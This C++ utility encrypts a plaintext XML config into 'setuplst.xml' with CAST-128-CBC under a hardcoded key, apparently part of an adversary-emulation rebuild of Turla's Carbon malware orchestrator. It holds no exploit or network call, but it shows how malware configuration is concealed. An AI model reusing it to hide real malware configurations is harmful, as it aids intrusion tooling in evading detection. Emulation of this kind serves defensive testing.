#include <windows.h>
#include <string>
#include <filesystem>
#include <algorithm>
#include <fstream>
#include <iostream>
#include <vector>
#include <stdexcept>
#include <iostream>
#include <cstring>
#include <vector>
#include "cast.h"
#include "osrng.h"
#include "pwdbased.h"
#include "sha.h"
#include "modes.h"
#include "filters.h"

std::string configPlainTextFileName = "configPlainText.xml";
std::string configFileName = "setuplst.xml";
std::vector<unsigned char> key = {
    (unsigned char)0xf2, (unsigned char)0xd4, (unsigned char)0x56, (unsigned char)0x08, 
    (unsigned char)0x91, (unsigned char)0xbd, (unsigned char)0x94, (unsigned char)0x86, 
    (unsigned char)0x92, (unsigned char)0xc2, (unsigned char)0x8d, (unsigned char)0x2a,
    (unsigned char)0x93, (unsigned char)0x91, (unsigned char)0xe7, (unsigned char)0xd9
};
CryptoPP::AutoSeededRandomPool prng;

std::string readFile(std::string targetFileName) {
    std::ifstream configFile;
    std::string line;
    std::string retStr;
    configFile.open(targetFileName);

    if (configFile.is_open()) {

        retStr = "";

        while (getline(configFile, line)) {
            retStr += line + "\n";
        }
        
        configFile.close();
        return retStr;

    } else {
        configFile.close();
        return "";
    }
}

std::vector<CryptoPP::byte> GenerateIvWrapper(size_t size) {
    // Generate IV
    // Reference: https://cryptopp.com/wiki/Initialization_Vector
    std::vector<CryptoPP::byte> iv = std::vector<CryptoPP::byte>(size);
    prng.GenerateBlock(&iv[0], size);
    return iv;
}

std::vector<char> Cast128Encrypt(std::vector<char> plaintext, std::vector<unsigned char> key) {
    size_t key_size = key.size();
    
    // Verify provided key size
    if (key_size != CryptoPP::CAST128::DEFAULT_KEYLENGTH) {
        throw std::runtime_error("Invalid key size.");
    }

    // Set key and IV. Note that IV and block size are both 8 bytes.
    CryptoPP::byte key_bytes[CryptoPP::CAST128::DEFAULT_KEYLENGTH];
    CryptoPP::byte iv_bytes[CryptoPP::CAST128::BLOCKSIZE];

    std::vector<CryptoPP::byte> iv = GenerateIvWrapper(CryptoPP::CAST128::BLOCKSIZE);
    
    std::memcpy(key_bytes, &key[0], CryptoPP::CAST128::DEFAULT_KEYLENGTH);
    std::memcpy(iv_bytes, &iv[0], CryptoPP::CAST128::BLOCKSIZE);

    // Buffer for ciphertext
    std::string ciphertext;
    ciphertext.reserve((CryptoPP::CAST128::BLOCKSIZE * 2) + plaintext.size());

    // Encrypt
    CryptoPP::CBC_Mode<CryptoPP::CAST128>::Encryption cast_encryptor(key_bytes, sizeof(key_bytes), iv_bytes);
    CryptoPP::StringSource(std::string(plaintext.begin(), plaintext.end()), true,
        new CryptoPP::StreamTransformationFilter(cast_encryptor,
            new CryptoPP::StringSink(ciphertext)
        )
    );

    // Prepend IV to ciphertext
    size_t combined_size = CryptoPP::CAST128::BLOCKSIZE + ciphertext.length();
    std::vector<char> iv_and_ciphertext = std::vector<char>(combined_size);
    for (int i = 0; i < CryptoPP::CAST128::BLOCKSIZE; i++) {
        iv_and_ciphertext[i] = (char)iv_bytes[i];
    }
    iv_and_ciphertext.insert(iv_and_ciphertext.begin() + CryptoPP::CAST128::BLOCKSIZE, ciphertext.begin(), ciphertext.end());
    iv_and_ciphertext.resize(combined_size);
    return iv_and_ciphertext;
}

std::vector<char> StrToVChar(std::string str) {
    std::vector<char> v(str.begin(), str.end());
    return v;
}

void OutputToFile(std::string filePath, std::vector<char> message) {
    std::ofstream file;
    file.open(filePath, std::ios::out | std::ios::binary);
    file.write((const char*)&message[0], message.size());
    file.close();
}

int main (int argc, char *argv[]) {
    (void)argc;
    (void)argv;

    std::string configData = readFile(configPlainTextFileName);
    if (configData == "") {
        std::cout << "Unable to find \\bin\\configPlainText.xml" << std::endl;
        std::cout << "This program expects to be run from \\turla\\Resources\\Carbon\\Orchestrator\\bin\\" << std::endl;
        std::cout << "and expects configPlainText.xml to exist in that folder." << std::endl;
        std::cout << "Enter \'1\' to exit." << std::endl;
        int x;
        std::cin >> x;
        return 0;
    }

    std::vector<char> configEnc = Cast128Encrypt(StrToVChar(configData), key);

    OutputToFile(configFileName, configEnc);

    return 0;
}